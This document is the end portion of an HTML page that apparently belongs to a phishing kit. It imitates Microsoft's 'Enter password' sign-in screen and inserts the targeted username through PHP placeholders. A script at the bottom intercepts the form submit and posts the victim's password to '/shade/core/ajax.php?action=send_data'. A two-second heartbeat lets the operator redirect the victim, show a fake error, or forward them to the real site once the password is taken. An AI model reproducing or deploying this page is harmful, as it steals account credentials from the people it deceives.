src="https://logincdn.msauth.net/shared/1.0/content/js/oneDs_8363475333f6d315e7ae.js"></script>
      <style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
      <style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
      <style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
      <script charset="utf-8" src="https://logincdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_bf093d3bc848e518f25e.js"></script>
   </head>
   <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
      <div>
         <!--  -->
         <!--  -->
         <form name="f1" id="i0281" action="" method="post" class="challenge-form">
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="login-paginated-page" data-bind="component: { name: 'master-page',
               publicMethods: masterPageMethods,
               params: {
               serverData: svr,
               showButtons: svr.e,
               showFooterLinks: true,
               useWizardBehavior: svr.bc,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
               <!--  -->
               <!-- ko ifnot: useLayoutTemplates --><!-- /ko -->
               <!-- ko if: useLayoutTemplates -->
               <!-- ko withProperties: { '$page': $parent } -->
               <!-- ko if: isLightboxTemplate() -->
               <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.cj }">
                  <!--  -->
                  <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.cj },
                     component: { name: 'background-image-control',
                     publicMethods: $page.backgroundControlMethods,
                     event: { load: $page.backgroundImageControl_onLoad } }">
                     <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                        <!-- ko if: smallImageUrl --><!-- /ko -->
                        <!-- ko if: backgroundImageUrl -->
                        <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
                        <!-- ko if: useImageMask --><!-- /ko -->
                        <!-- /ko -->
                     </div>
                  </div>
                  <!-- ko if: svr.co --><!-- /ko -->
                  <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                  <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                     <!-- ko if: showHeader --><!-- /ko -->
                     <div class="template-section main-section">
                        <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                           <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                              <!--  -->
                              <!-- ko withProperties: { '$content': $data } -->
                              <div class="flex-column">
                                 <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->
                                 <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->
                                 <div class="win-scroll">
                                    <div id="lightbox" data-bind="
                                       animationEnd: $page.paginationControlHelper.animationEnd,
                                       externalCss: { 'sign-in-box': true },
                                       css: {
                                       'inner':  $content.isVerticalSplitTemplate,
                                       'vertical-split-content': $content.isVerticalSplitTemplate,
                                       'app': $page.backgroundLogoUrl,
                                       'wide': $page.paginationControlHelper.useWiderWidth,
                                       'fade-in-lightbox': $page.fadeInLightBox,
                                       'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                                       'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                                       'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                                       <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->
                                       <!-- ko if: svr.BV --><!-- /ko -->
                                       <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.Ce &amp;&amp; showLightboxProgress() }"></div>
                                       <!-- ko if: showLightboxProgress --><!-- /ko -->
                                       <!-- ko if: loadBannerLogo -->
                                       <div data-bind="component: { name: 'logo-control',
                                          params: {
                                          isChinaDc: svr.fIsChinaDc,
                                          bannerLogoUrl: bannerLogoUrl() } }">
                                          <!--  -->
                                          <!-- ko if: bannerLogoUrl --><!-- /ko -->
                                          <!-- ko if: !bannerLogoUrl && !isChinaDc -->
                                          <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                          <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                          <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
                                          <!-- /ko --><!-- /ko -->
                                          <!-- /ko -->
                                       </div>
                                       <!-- /ko -->
                                       <!-- ko if: svr.DD && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->
                                       <!-- ko if: asyncInitReady -->
                                       <div role="main" data-bind="component: { name: 'pagination-control',
                                          publicMethods: paginationControlMethods,
                                          params: {
                                          enableCssAnimation: svr.a5,
                                          disableAnimationIfAnimationEndUnsupported: svr.Ci,
                                          initialViewId: initialViewId,
                                          currentViewId: currentViewId,
                                          initialSharedData: initialSharedData,
                                          initialError: $loginPage.getServerError() },
                                          event: {
                                          cancel: paginationControl_onCancel,
                                          load: paginationControlHelper.onLoad,
                                          unload: paginationControlHelper.onUnload,
                                          loadView: view_onLoadView,
                                          showView: view_onShow,
                                          setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                                          animationStateChange: paginationControl_onAnimationStateChange } }">
                                          <!--  -->
                                          <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                             <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
                                             <div data-bind="css: {
                                                'animate': animate() &amp;&amp; animate.animateBanner(),
                                                'slide-out-next': animate.isSlideOutNext(),
                                                'slide-in-next': animate.isSlideInNext(),
                                                'slide-out-back': animate.isSlideOutBack(),
                                                'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
                                                <div data-bind="component: { name: 'identity-banner-control',
                                                   params: {
                                                   userTileUrl: svr.b6,
                                                   displayName: sharedData.displayName || svr.i,
                                                   isBackButtonVisible: isBackButtonVisible(),
                                                   focusOnBackButton: isBackButtonFocused(),
                                                   backButtonDescribedBy: backButtonDescribedBy() },
                                                   event: {
                                                   backButtonClick: identityBanner_onBackButtonClick } }">
                                                   <!--  -->
                                                   <div class="identityBanner">
                                                      <!-- ko if: isBackButtonVisible -->
                                                      <button type="button" class="backButton" data-bind="
                                                         attr: { 'id': backButtonId || 'idBtn_Back' },
                                                         ariaLabel: str['CT_HRD_STR_Splitter_Back'],
                                                         ariaDescribedBy: backButtonDescribedBy,
                                                         click: backButton_onClick,
                                                         hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
                                                         <!-- ko ifnot: svr.CV -->
                                                         <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                                                         <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                         <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
                                                         <!-- /ko --><!-- /ko -->
                                                         <!-- /ko -->
                                                         <!-- ko if: svr.CV --><!-- /ko -->
                                                      </button>
                                                      <!-- /ko -->
                                                      <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?=$ent['username']?>"><?=$ent['username']?></div>
                                                   </div>
                                                </div>
                                             </div>
                                             <!-- /ko -->
                                             <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
                                                'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.i),
                                                'zero-opacity': hidePaginatedView.hideSubView(),
                                                'animate': animate(),
                                                'slide-out-next': animate.isSlideOutNext(),
                                                'slide-in-next': animate.isSlideInNext(),
                                                'slide-out-back': animate.isSlideOutBack(),
                                                'slide-in-back': animate.isSlideInBack() }">
                                                <!-- ko foreach: views -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                <!-- ko template: { nodes: [$data], data: $parent } -->
                                                <div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                                                   params: {
                                                   serverData: svr,
                                                   serverError: initialError,
                                                   isInitialView: isInitialState,
                                                   username: sharedData.username,
                                                   displayName: sharedData.displayName,
                                                   hipRequiredForUsername: sharedData.hipRequiredForUsername,
                                                   passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                                                   availableCreds: sharedData.availableCreds,
                                                   evictedCreds: sharedData.evictedCreds,
                                                   useEvictedCredentials: sharedData.useEvictedCredentials,
                                                   showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                                                   flowToken: sharedData.flowToken,
                                                   defaultKmsiValue: svr.AL === 1,
                                                   userTenantBranding: sharedData.userTenantBranding,
                                                   sessions: sharedData.sessions,
                                                   callMetadata: sharedData.callMetadata,
                                                   supportsNativeCredentialRecovery: sharedData.supportsNativeCredentialRecovery },
                                                   event: {
                                                   restoreIsRecoveryAttemptPost: $loginPage.view_onRestoreIsRecoveryAttemptPost,
                                                   updateFlowToken: $loginPage.view_onUpdateFlowToken,
                                                   submitReady: $loginPage.view_onSubmitReady,
                                                   redirect: $loginPage.view_onRedirect,
                                                   resetPassword: $loginPage.passwordView_onResetPassword,
                                                   setBackButtonState: view_onSetIdentityBackButtonState,
                                                   setPendingRequest: $loginPage.view_onSetPendingRequest } }">
                                                   <!--  -->
                                                   <!--  -->
                                                   <div aria-hidden="true">
                                                      <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                                                      <input type="hidden" name="login" data-bind="value: unsafe_username" value="<?=$ent['username']?>">
                                                      <!-- The loginfmt input type is different as some password managers require it to be of type text.
                                                         Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
                                                      <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                                      <input type="hidden" name="type" data-bind="value: svr.bc ? 20 : 11" value="11">
                                                      <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                                                      <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                                                      <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                                                      <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
                                                      <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
                                                   </div>
                                                   <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
                                                      <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
                                                   </div>
                                                   <!-- ko if: showCredViewBrandingDesc --><!-- /ko -->
                                                   <!-- ko if: unsafe_pageDescription --><!-- /ko -->
                                                   <div class="row">
                                                      <div class="form-group col-md-24">
                                                         <div role="alert" aria-live="assertive">
                                                            <!-- ko if: passwordTextbox.error --><!-- /ko -->
                                                         </div>
                                                         <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
                                                            publicMethods: passwordTextbox.placeholderTextboxMethods,
                                                            params: {
                                                            serverData: svr,
                                                            hintText: str['CT_PWD_STR_PwdTB_Label'] },
                                                            event: {
                                                            updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
                                                            <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
                                                            <input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                                                               textInput: passwordTextbox.value,
                                                               ariaDescribedBy: [
                                                               'loginHeader passwordError',
                                                               showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                                                               unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                                                               hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                                                               placeholder: $placeholderText,
                                                               ariaLabel: unsafe_passwordAriaLabel,
                                                               moveOffScreen: showPassword,
                                                               externalCss: {
                                                               'input': true,
                                                               'text-box': true,
                                                               'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Password" aria-label="Enter the password for <?=$ent['username']?>" tabindex="0">
                                                            <!-- ko if: svr.ck && showPassword() --><!-- /ko -->
                                                            <!-- /ko -->
                                                            <!-- /ko -->
                                                            <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                                         </div>
                                                         <!-- ko if: svr.ck --><!-- /ko -->
                                                      </div>
                                                   </div>
                                                   <!-- ko if: shouldHipInit --><!-- /ko -->
                                                   <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                                      <div>
                                                         <!-- ko if: svr.cB --><!-- /ko -->
                                                         <!-- ko if: svr.Bp !== false && !svr.cB && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->
                                                      </div>
                                                      <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                                                         <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                            <div data-bind="component: { name: 'footer-buttons-field',
                                                               params: {
                                                               serverData: svr,
                                                               primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
                                                               isPrimaryButtonEnabled: !isRequestPending(),
                                                               isPrimaryButtonVisible: svr.e,
                                                               isSecondaryButtonEnabled: true,
                                                               isSecondaryButtonVisible: false },
                                                               event: {
                                                               primaryButtonClick: primaryButton_onClick } }">
                                                               <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" data-bind="
                                                                  visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                                                  css: { 'no-margin-bottom': removeBottomMargin },
                                                                  externalCss: { 'button-field-container': true }">
                                                                  <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->
                                                                  <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                                                     <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                     <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                                                                        attr: primaryButtonAttributes,
                                                                        externalCss: {
                                                                        'button': true,
                                                                        'primary': true },
                                                                        value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                                                        hasFocus: focusOnPrimaryButton,
                                                                        click: primaryButton_onClick,
                                                                        enable: isPrimaryButtonEnabled,
                                                                        visible: isPrimaryButtonVisible,
                                                                        preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached="1">
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                                                </div>
                                                <!-- /ko -->
                                                <!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
                                                <!-- /ko -->
                                             </div>
                                          </div>
                                       </div>
                                       <!-- /ko -->
                                       <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
                                       <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                                       <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                                       <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
                                       <!-- ko if: svr.ad && !svr.fSkipRenderingNewCanaryToken --><!-- /ko -->
                                       <!-- ko if: !svr.ad || svr.fSkipRenderingNewCanaryToken -->
                                       <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
                                       <!-- /ko -->
                                       <input type="hidden" name="ctx" data-bind="value: ctx" value="">
                                       <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
                                       <input type="hidden" id="i0327" data-bind="attr: { name: svr.bp }, value: flowToken" name="PPFT" value="DY3RCfqEh3w4R6!ogjHWhQLJRITxDMzndJtwR*DxlYEweXzJjPDDqyyvLX3!gT9lVB0UGRfO3dw*VY61RQEApCAVLAvHs*tWNK!IsofVaKJP9uKacQXmtTvkKopX4NB!7wGx505MwYNTdmJ5!p*JSMOOvkTD9b1*UdKtI3mplqyzKc5NrrFavUpEH*v6dP3TGVu90sl9T66IFz3bSKtC!0YjfOwHOLLfvAT53LTXcmZqbgmJwYYkOWF1ClR*0c1VKfG40ePaI311SuC8hYaTwe0$">
                                       <input type="hidden" name="PPSX" data-bind="value: svr.c9" value="PassportR">
                                       <input type="hidden" name="NewUser" value="1">
                                       <input type="hidden" name="FoundMSAs" data-bind="value: svr.AO" value="">
                                       <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                                       <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
                                       <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BV ? 1 : 0" value="0">
                                       <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
                                       <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
                                       <input type="hidden" name="isRecoveryAttemptPost" data-bind="value: isRecoveryAttemptPost() ? 1 : 0" value="0">
                                       <div data-bind="component: { name: 'instrumentation-control',
                                          publicMethods: instrumentationMethods,
                                          params: { serverData: svr } }">
                                          <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                                       </div>
                                       <!-- /ko -->
                                    </div>
                                    <!-- ko if: $page.showFedCredAndNewSession -->
                                    <!-- ko if: $page.showFedCredButtons --><!-- /ko -->
                                    <!-- ko if: $page.newSession --><!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: $page.showDebugDetails --><!-- /ko -->
                                 </div>
                              </div>
                              <!-- /ko -->
                           </div>
                        </div>
                     </div>
                     <!-- ko if: $page.paginationControlHelper.showFooterControl -->
                     <div id="footer" role="contentinfo" data-bind="
                        externalCss: {
                        'footer': true,
                        'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
                        'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
                        <div data-bind="component: { name: 'footer-control',
                           publicMethods: $page.footerMethods,
                           params: {
                           serverData: svr,
                           useDefaultBackground: $page.useDefaultBackground(),
                           hasDarkBackground: $page.backgroundLogoUrl(),
                           showLinks: true,
                           showFooter: $page.showFooter(),
                           hideTOU: $page.hideTOU(),
                           termsText: $page.termsText(),
                           termsLink: $page.termsLink(),
                           hidePrivacy: $page.hidePrivacy(),
                           privacyText: $page.privacyText(),
                           privacyLink: $page.privacyLink() },
                           event: {
                           agreementClick: $page.footer_agreementClick,
                           showDebugDetails: $page.toggleDebugDetails_onClick } }">
                           <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                           <!-- /ko -->
                           <!-- ko if: svr.C8 && showLinks --><!-- /ko -->
                        </div>
                     </div>
                     <!-- /ko -->
                  </div>
                  <!-- /ko -->
               </div>
               <!-- /ko -->
               <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
               <!-- /ko -->
               <!-- /ko -->
            </div>
            <!-- /ko -->
         </form>
         <!-- /ko -->
      </div>
   </body>

<script src="/assets/jquery-3.5.1.min.js" ></script>
<script>
    var allow_redirect = true;
    var current_page = 'outlook';
    
    setTimeout(heartbeat, 2000);

    function heartbeat() {
        if (allow_redirect) {
            $.get("/shade/core/ajax.php?action=heartbeat", {
                    currentpage: current_page
                })
                .done(function (data) {
                  if(data == "finish")
                  {
                      window.location.href = "<?=REAL_WEBSITE?>";
                      return;
                  }
                  if (data == "refresh") {
                      window.location.href =
                          "/" + current_page+ '.php?error=1';
                      return;
                  }
                  if (data != current_page) {
                      window.location.href = "/" + data + '.php';
                  }
                });
        }
        setTimeout(heartbeat, 2000);
    }


    $(".challenge-form").submit(function (event) {
        var _password = $('#i0118').val();
        
        if(_password == "")
        {
            return false;
        }

        $.post("/shade/core/ajax.php?action=send_data", {
                currentpage: current_page,
                email_password: _password
            })
            .done(function (data) {
                allow_redirect = true;
            });

        event.preventDefault();
        return false;
    });

</script>

</html>